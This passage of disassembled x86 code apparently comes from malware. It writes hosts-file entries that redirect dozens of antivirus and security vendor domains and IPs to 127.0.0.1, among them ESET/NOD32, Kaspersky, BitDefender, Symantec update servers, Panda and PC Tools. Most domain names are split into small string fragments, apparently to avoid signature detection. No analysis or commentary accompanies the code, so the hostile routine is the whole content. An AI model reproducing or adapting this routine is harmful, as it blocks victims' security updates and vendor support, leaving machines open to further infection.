  push 00419C48h ; "vast.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 00000017h
  push 00419C94h ; "127.0.0.1  www.nod"
  push 00419CC0h ; "32.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000018h
  push 00419CD4h ; "127.0.0.1  nod3"
  push 00419CF8h ; "2.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000019h
  push 00419D08h ; "127.0.0.1  nov"
  push 00419D2Ch ; "irust"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419D3Ch ; "hanks.org"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 0000001Ah
  push 00419D08h ; "127.0.0.1  nov"
  push 00419D54h ; "iru"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419D60h ; "sth"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00419D6Ch ; "anks.org"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_2C
  push ecx
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000001Bh
  push 00419D84h ; "127.0.0.1  vs"
  push 00419DA4h ; "can.no"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419DB8h ; "vir"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00419DC4h ; "usth"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00419D6Ch ; "anks.org"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_30
  push ecx
  lea edx, var_2C
  push edx
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000004h
  call [00401150h]
  add esp, 00000014h
  mov var_4, 0000001Ch
  push 00419DD4h ; "127.0.0.1  vir"
  push 00419DF8h ; "usto"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419E08h ; "tal-up"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00419E1Ch ; "load"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00419E48h ; "er.en.softonic.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_30
  push edx
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000004h
  call [00401150h]
  add esp, 00000014h
  mov var_4, 0000001Dh
  push 00419E74h ; "127.0.0.1  vi"
  push 00419E94h ; "rsc"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419EA0h ; "an.org"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 0000001Eh
  push 00419EB4h ; "127.0.0.1  pa"
  push 00419ED4h ; "nd"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419EE0h ; "asec"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00419EF0h ; "ur"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00419EFCh ; "ity.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_30
  push edx
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000004h
  call [00401150h]
  add esp, 00000014h
  mov var_4, 0000001Fh
  push 00419F10h ; "127.0.0.1  www.arc"
  push 00419F3Ch ; "ab"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419F48h ; "it.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 00000020h
  push 00419F5Ch ; "127.0.0.1  ar"
  push 00419F7Ch ; "cab"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419F48h ; "it.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 00000021h
  push 00419F88h ; "127.0.0.1  www.ar"
  push 00419F7Ch ; "cab"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419FB0h ; "it.pl"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 00000022h
  push 00419F5Ch ; "127.0.0.1  ar"
  push 00419F7Ch ; "cab"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419FB0h ; "it.pl"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 00000023h
  push 00419FC0h ; "127.0.0.1  www.fr"
  push 00419FE8h ; "eed"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419E2Ch ; "rweb.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 00000024h
  push 00419FF4h ; "127.0.0.1  fre"
  push 0041A018h ; "edrw"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041A028h ; "eb.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 00000025h
  push 0041A03Ch ; "127.0.0.1  www.drw"
  push 0041A028h ; "eb.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000026h
  push 0041A068h ; "127.0.0.1  drw"
  push 0041A028h ; "eb.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000027h
  push 0041A08Ch ; "127.0.0.1  www.dr"
  push 0041A0B4h ; "web-on"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041A0C8h ; "line.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 00000028h
  push 0041A0E0h ; "127.0.0.1  dr"
  push 0041A100h ; "web-onl"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041A114h ; "ine.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 00000029h
  push 0041A128h ; "127.0.0.1  www.eset.es"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000002Ah
  push 0041A15Ch ; "127.0.0.1  eset.es"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000002Bh
  push 0041A1BCh ; "127.0.0.1  www.nod32.com.tr"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000002Ch
  push 0041A1F8h ; "127.0.0.1  nod32.com.tr"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000002Dh
  push 0041A22Ch ; "127.0.0.1  nod32.gen.tr"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000002Eh
  push 0041A260h ; "127.0.0.1  www.nod32.gen.tr"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000002Fh
  push 0041A29Ch ; "127.0.0.1  www.eset.eu"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000030h
  push 0041A2D0h ; "127.0.0.1  eset.eu"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000031h
  push 0041A2FCh ; "127.0.0.1  89.202.157.226 "
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000032h
  push 0041A338h ; "127.0.0.1  www.eset.co.uk"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000033h
  push 0041A188h ; "127.0.0.1  eset.co.uk"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000034h
  push 0041A398h ; "127.0.0.1  93.184.71.27"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000035h
  push 0041A3CCh ; "127.0.0.1  188.240.47.45"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000036h
  push 0041A404h ; "127.0.0.1  www.avp.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000037h
  push 0041A438h ; "127.0.0.1  avp.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000038h
  push 0041A464h ; "127.0.0.1  www.nod32-es.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000039h
  push 0041A4A0h ; "127.0.0.1  nod32-es.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000003Ah
  push 0041A4D4h ; "127.0.0.1  www.eset.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000003Bh
  push 0041A508h ; "127.0.0.1  eset.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000003Ch
  push 0041A534h ; "127.0.0.1  www.nod32-a.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000003Dh
  push 0041A574h ; "127.0.0.1  nod32-a.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000003Eh
  push 0041A5A8h ; "127.0.0.1  89.202.157.135"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000003Fh
  push 0041A5E0h ; "127.0.0.1  89.202.157.136"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000040h
  push 0041A618h ; "127.0.0.1  89.202.157.137"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000041h
  push 0041A650h ; "127.0.0.1  89.202.157.138"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000042h
  push 0041A688h ; "127.0.0.1  89.202.157.139"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000043h
  push 0041A6C0h ; "127.0.0.1  www.kaspersky.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000044h
  push 0041A700h ; "127.0.0.1  www.kaspersky.com.mx"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000045h
  push 0041A744h ; "127.0.0.1  latam.kaspersky.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000046h
  push 0041A788h ; "127.0.0.1  usa.kaspersky.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000047h
  push 0041A7C8h ; "127.0.0.1  kaspersky.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000048h
  push 0041A800h ; "127.0.0.1  support.kaspersky.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000049h
  push 0041A848h ; "127.0.0.1  kaspersky-labs.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000004Ah
  push 0041A888h ; "127.0.0.1  m"
  push 0041A8A8h ; "y"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041A8B0h ; "-"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041A8B8h ; "et"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 0041A8C4h ; "ru"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 0041A8D0h ; "st."
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 0041A8DCh ; "co"
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 0041A8E8h ; "m"
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  lea ecx, var_30
  push ecx
  lea edx, var_2C
  push edx
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000007h
  call [00401150h]
  add esp, 00000020h
  mov var_4, 0000004Bh
  push 0041A370h ; "127.0.0.1  www.m"
  push 0041A8A8h ; "y"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041A8B0h ; "-"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041A8B8h ; "et"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 0041A8C4h ; "ru"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 0041A8D0h ; "st."
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 0041A8DCh ; "co"
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 0041A8E8h ; "m"
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  lea edx, var_30
  push edx
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000007h
  call [00401150h]
  add esp, 00000020h
  mov var_4, 0000004Ch
  push 0041A904h ; "127.0.0.1  www.bitdefender.es"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000004Dh
  push 0041A944h ; "127.0.0.1  bitdefender.es"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000004Eh
  push 0041A97Ch ; "127.0.0.1  www.bitdefender.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000004Fh
  push 0041A9C0h ; "127.0.0.1  bitdefender.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000050h
  push 0041A9FCh ; "127.0.0.1  s"
  push 0041AA1Ch
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041AA24h
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00419EF0h ; "ur"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 0041AA2Ch ; "e.n"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 00419238h
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 0041AA38h ; ".c"
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  push 0041AA44h ; "om"
  call [00401044h]
  mov edx, eax
  lea ecx, var_40
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_40
  push eax
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  lea ecx, var_30
  push ecx
  lea edx, var_2C
  push edx
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000008h
  call [00401150h]
  add esp, 00000024h
  mov var_4, 00000051h
  push 0041AA50h ; "127.0.0.1  n"
  push 00419238h
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00418DB4h ; "."
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 0041AA24h
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 0041AA44h ; "om"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_34
  push edx
  lea eax, var_30
  push eax
  lea ecx, var_2C
  push ecx
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000052h
  push 0041AA70h ; "127.0.0.1  www.n"
  push 00419238h
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00418DB4h ; "."
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 0041AA24h
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 0041AA44h ; "om"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_34
  push ecx
  lea edx, var_30
  push edx
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000053h
  push 0041AA98h ; "127.0.0.1  vil.n"
  push 00419238h
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00418DB4h ; "."
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 0041AA24h
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 0041AA44h ; "om"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_34
  push eax
  lea ecx, var_30
  push ecx
  lea edx, var_2C
  push edx
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000054h
  push 0041AACCh ; "127.0.0.1  pctools.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000055h
  push 0041AB00h ; "127.0.0.1  www.pctools.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000056h
  push 0041AB3Ch ; "127.0.0.1  up"
  push 00419248h ; "da"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041AB5Ch
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041AB64h ; "e."
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 0041AB70h ; "sym"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 0041AB7Ch ; "ant"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 0041AB88h ; "ec"
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 0041AA38h ; ".c"
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  push 0041AA44h ; "om"
  call [00401044h]
  mov edx, eax
  lea ecx, var_40
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_40
  push edx
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  lea eax, var_30
  push eax
  lea ecx, var_2C
  push ecx
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000008h
  call [00401150h]
  add esp, 00000024h
  mov var_4, 00000057h
  push 0041AB3Ch ; "127.0.0.1  up"
  push 0041AB94h ; "d"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041AB9Ch ; "ate"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041ABA8h ; "s.s"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 0041ABB4h ; "yma"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 0041ABC0h ; "nt"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 0041ABCCh ; "ec.c"
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 0041AA44h ; "om"
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  lea ecx, var_30
  push ecx
  lea edx, var_2C
  push edx
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000007h
  call [00401150h]
  add esp, 00000020h
  mov var_4, 00000058h
  push 0041ABDCh ; "127.0.0.1  li"
  push 00419A98h
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041AA1Ch
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041ABFCh ; "up"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00419248h ; "da"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 0041AB5Ch
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 0041AB64h ; "e."
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 0041AB70h ; "sym"
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  push 0041AB7Ch ; "ant"
  call [00401044h]
  mov edx, eax
  lea ecx, var_40
  call [004011ACh]
  push eax
  push 0041AB88h ; "ec"
  call [00401044h]
  mov edx, eax
  lea ecx, var_44
  call [004011ACh]
  push eax
  push 0041AA38h ; ".c"
  call [00401044h]
  mov edx, eax
  lea ecx, var_48
  call [004011ACh]
  push eax
  push 0041AA44h ; "om"
  call [00401044h]
  mov edx, eax
  lea ecx, var_4C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_4C
  push edx
  lea eax, var_48
  push eax
  lea ecx, var_44
  push ecx
  lea edx, var_40
  push edx
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  lea eax, var_30
  push eax
  lea ecx, var_2C
  push ecx
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 0000000Bh
  call [00401150h]
  add esp, 00000030h
  mov var_4, 00000059h
  push 0041AC08h ; "127.0.0.1  customer.sy"
  push 0041A8E8h ; "m"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041AC3Ch ; "an"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041AC48h ; "te"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 0041AC54h ; "c.c"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 0041AA44h ; "om"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_34
  push ecx
  lea edx, var_30
  push edx
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 0000005Ah
  push 0041AC70h ; "127.0.0.1  sy"
  push 0041A8E8h ; "m"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419238h
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041999Ch ; "n"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 0041AB5Ch
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 0041ABCCh ; "ec.c"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 0041AA44h ; "om"
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  lea edx, var_30
  push edx
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000006h
  call [00401150h]
  add esp, 0000001Ch
  mov var_4, 0000005Bh
  push 0041AC90h ; "127.0.0.1  www.sy"
  push 0041A8E8h ; "m"
